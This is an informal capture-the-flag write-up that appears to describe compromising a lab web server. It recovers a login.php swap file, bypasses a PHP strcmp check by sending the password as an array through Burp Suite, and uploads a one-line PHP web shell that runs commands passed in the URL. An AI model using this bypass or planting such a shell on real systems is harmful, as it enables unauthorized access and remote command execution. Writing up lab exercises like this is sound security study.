this was fairly simple, just a few steps to it.

first you can use directory traversal in the login url to just go to the /login
directory.

here you can see 3 files, the .swp one you can download.
you can use strings to check the .swp file for strings or
you can use vim (!) to read this using the followng command

vim -r login.php.swp

here we can see a bit of php code that checks the username and password which is done
using strcmp. using google and php docs we cam see there is a vuln here. it compares if == to 0
not using 3 = so doent check types. because of how this workks "7 dogs" == 7 returns true and
so on. 0 is equal to true,  so if we can use this vuln to return true, then we can login.

If we pass in the password as an array eg: password[]='test' in the html request, it will return
null.  due to the previously mentioned flaw, null == 0 = true.

knowing this, using burpsuite, we can take the http request for login, send it to the repeater, add []
to the end of password (before the =) and send it with any password (user admin) and we will get a 
successful login.

now we are logged in, we only have one option on the admin page, fortunately, it is the ability to upload a file.
i tried a more complicated reverse php shell first, but it didn't work so i ended up using a 'barebones' reverse shell
script called shell.php containing:

<?php system ($_GET['cmd']); ?>

and that's all. this is the file i upload in the admin area.
